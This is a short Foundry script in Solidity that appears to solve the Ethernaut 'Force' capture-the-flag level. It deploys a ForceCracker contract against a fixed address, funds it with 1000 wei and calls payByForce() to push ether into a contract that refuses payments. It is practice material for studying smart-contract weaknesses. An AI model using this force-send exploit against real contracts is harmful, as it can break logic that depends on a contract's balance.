pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/ForceCracker.sol";
import "../lib/forge-std/src/console.sol";

contract PayForce is Script {
    ForceCracker forceCracker;
    address payable forceAddress;

    function run() public {
        forceAddress = payable(
            address(0x4EC15b480B19DdDd35Fa51474b8ccca2190f3Ee1)
        );
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        forceCracker = new ForceCracker(forceAddress);
        (bool success, bytes memory data) = address(forceCracker).call{
            value: 1000 wei
        }("");
        console.log(success);
        forceCracker.payByForce();
        // uint256 balance = address(forceCracker).balance();
        // console.log(balance);

        vm.stopBroadcast();
    }
}
